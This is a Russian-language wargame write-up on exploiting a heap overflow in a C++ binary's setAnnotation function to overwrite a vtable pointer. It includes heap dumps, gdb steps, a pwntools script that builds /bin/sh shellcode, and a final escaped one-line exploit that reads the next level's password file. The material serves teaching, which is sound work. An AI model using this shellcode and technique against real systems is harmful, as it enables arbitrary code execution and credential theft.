# Level 9 - переполнение в куче #3

В функции `setAnnotation` не учитывается размер аллоцированного чанка (```this```), поэтому функция `memcpy` может потереть следующие за ним данные.

```c++
void *setAnnotation(N *this, char *s) {

	size_t v2;

	v2 = strlen(s);
	return memcpy((char *)this + 4, s, v2);
}
```

Бинарный файл представляет собой код на c++, поэтому здесь есть такая структура как `vtable`, содержащая указатели на функции. Перетерев один из таких указателей, мы сможем перейти на контролируемый участок памяти.

Так выглядит куча после аллокации двух структур `N`. Адрес `0x8048848` указывает на функци `operator+`.
```c
0x804ebb0:	0x8048848			__	__	__	__		__	__	__	__		__	__	__	__	H...            
0x804ebc0:	__	__	__	__		__	__	__	__		__	__	__	__		__	__	__	__	                
0x804ebd0:	__	__	__	__		__	__	__	__		__	__	__	__		__	__	__	__	                
0x804ebe0:	__	__	__	__		__	__	__	__		__	__	__	__		__	__	__	__	                
0x804ebf0:	__	__	__	__		__	__	__	__		__	__	__	__		__	__	__	__	                
0x804ec00:	__	__	__	__		__	__	__	__		__	__	__	__		__	__	__	__	                
0x804ec10:	__	__	__	__		__	__	__	__		05	00	00	00		71	00	00	00	        ....q...
0x804ec20:	0x8048848			__	__	__	__		__	__	__	__		__	__	__	__	H...            
```

После функции `setAnnotation`, куча выглядит следующим образом:
```c
0x804ebb0:	0x8048848			0x804ebb8			6a	68	68	2f		2f	2f	73	68	H.......jhh///sh
0x804ebc0:	2f	62	69	6e		89	e3	68	01		01	01	01	81		34	24	72	69	/bin..h.....4$ri
0x804ebd0:	01	01	31	c9		51	6a	04	59		01	e1	51	89		e1	31	d2	6a	..1.Qj.Y..Q..1.j
0x804ebe0:	0b	58	cd	80		41	41	41	41		41	41	41	41		41	41	41	41	.X..AAAAAAAAAAAA
0x804ebf0:	41	41	41	41		41	41	41	41		41	41	41	41		41	41	41	41	AAAAAAAAAAAAAAAA
0x804ec00:	__	__	__	__		__	__	__	__		__	__	__	__		__	__	__	__	                
0x804ec10:	__	__	__	__		__	__	__	__		05	00	00	00		71	00	00	00	        ....q...
0x804ec20:	0x8048848			__	__	__	__		__	__	__	__		__	__	__	__	H...
```
Все появившиеся данные - аргумент, который контролирует пользователь. Длина аргумента никак не регулируется, поэтому существует возможность переписать адрес функции `operator+` на любой другой.

В функции `main` указатель до функции `operator+` дважды разыменовывается
```c
void main(int argc, char **argv) {
	...
	return (*n2->_vptr->operator+)(n2,n1);
}
```
Поэтому требуется подготовить следующую цепочку вызова:

	[Указатель1 на указатель2] -> [Указатель2 на функцию] -> [Функция] -> [Шелл].


Для таких операций нужен адрес кучи. Узнаем его в `gdb`: брякаемся на функцию `new` и смотрим `eax`:
```bash
(gdb) start qwdqwd
...
(gdb) b *0x0804861e # operator new
(gdb) c
...
(gdb) p/x $eax
$2 = 0x804a008
```

`0x804a008` адрес первого чанка в куче, от которого будем отталкиваться, формируя пейлоад

	[Указатель на шеллкод] -> [Шеллкод] -> [Padding] -> [Указатель на первый указатель]
	|________________________________________________|  |_____________________________|
							|											|
						chunk 1										  chunk2

В `питоне` с помощью библиотеки `pwntools` выглядит так:
```python
from pwn import *

heap_addr = 0x804a008
payload = p32(heap_addr + 8) # Указатель на шеллкод
payload += asm(shellcraft.sh())).ljust(108, b"A") # Шеллкод и паддинг
payload += p32(heap_addr + 4) # указатель на указатель
print(payload)

# ./level9 `echo -ne '\x10\xa0\x04\x08jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0c\xa0\x04\x08'`
# $ cat /home/user/bonus0/.pass
```
